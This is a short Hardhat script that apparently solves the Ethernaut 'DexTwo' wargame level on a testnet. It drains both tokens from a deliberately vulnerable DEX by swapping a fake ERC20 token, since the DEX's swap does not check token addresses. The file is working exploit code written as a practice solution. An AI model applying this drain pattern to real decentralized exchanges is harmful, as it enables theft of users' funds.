import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Instance address
    let address_a = "0xE14Ae12dB3F2Db84D224d4882bAa80cbdBb5e998";

    // our own fake token
    let token3 = "0x7A38c6fFC6A6f691ec7d64312cFF804D3f70760C";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("DexTwo", address_a, signer);
    // deploy a contract to mint some fake tokens
    let contract_b = await ethers.getContractAt("contracts/Dex2.sol:SwappableTokenTwo", token3, signer);
    // contract just to approve transaction
    let approve_contract = await ethers.getContractAt("DexTwo_approve","0xd05670dDCB991820dab4BF3F448AF21ec1ee8C77" ,signer);

    //TODO couldn't approve with contract_b, not sure why
    await(await approve_contract.approve(address_a,1000).wait());

    let token1 = await contract_a.token1();
    let token2 = await contract_a.token2();

    // transfer 100 of our fake token over to DEX
    let tx = await contract_b.transfer(address_a, 100);
    await tx.wait();
    // exchange has 100,100,100
    // we can clear our token 1 by trading exactly 100 of our fake token
    // -> 0 100 200
    // we can clear out token 2 by trading 200 of our fake token
    // -> 0 0 400
    tx = await contract_a.swap(token3,token1,100);
    tx.wait();
    tx = await contract_a.swap(token3,token2,200);
    tx.wait();



}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
